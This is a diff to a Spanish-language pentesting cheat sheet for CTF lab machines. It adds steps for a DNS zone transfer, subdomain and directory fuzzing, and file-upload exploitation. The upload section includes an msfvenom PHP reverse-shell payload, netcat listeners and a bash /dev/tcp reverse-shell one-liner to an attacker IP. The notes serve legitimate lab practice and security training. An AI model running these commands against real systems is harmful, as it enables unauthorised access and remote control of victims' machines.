@@ -31,5 +31,68 @@ sudo nano /etc/hosts
 wfuzz -c --hc=404 --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.logan.hmv" -u <IP máquina víctima> 
 ```
 
-> Nota: también hay que añadir lo que encontremos
+> **Nota:** también hay que añadir lo que encontremos en el /etc/hosts&#x20;
 
+## Cómo Hacer un Ataque de Transferencia de Zona DNS
+
+{% embed url="https://vulnyx.com/#hunter" %}
+
+Tenemos un dominio y el puerto 53 se puede realizar este ataque&#x20;
+
+```bash
+dig axfr <dominio> @<IP máquina víctima>
+```
+
+> **Nota**: también hay que añadir lo que encontremos en el /etc/hosts&#x20;
+
+```bash
+wfuzz -c --hc=404 --hl=367 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.<dominio>" -u <IP máquina víctima>
+```
+
+> **Nota**: también hay que añadir lo que encontremos en el /etc/hosts&#x20;
+
+## Otras Herramientas Fuzzing Web – Uso de WFUZZ, DIRB y DIRSEARCH
+
+{% embed url="https://vulnyx.com/#jenk" %}
+
+```bash
+wfuzz -c --hc 404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://<IP máquina víctima/FUZZ
+```
+
+```bash
+dirb http://<IP máquina víctima>
+```
+
+```bash
+dirsearch -u http://<IP máquina víctima>/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+```
+
+## Explotación de vulnerabilidad File Upload
+
+{% embed url="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141" %}
+
+```bash
+msfvenom -p php/reverse_tcp LHOST=<IP máquina atacante> LPORT=443 -f raw >pwned.php
+```
+
+Tenemos que ver siempre donde se subió por lo que realizamos el comando:
+
+```bash
+gobuster dir -u http://<IP máquina víctima>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+```
+
+Nos ponemos en escucha.
+
+```bash
+nc -nlvp 443
+```
+
+Nos mandamos la Reverse Shell. Por lo que nos ponemos en escucha otra vez.
+
+```bash
+nc -nlvp 4444
+```
+
+```bash
+bash -c "sh -i >& /dev/tcp/<IP máquina atacante/4444 0>&1"
+```
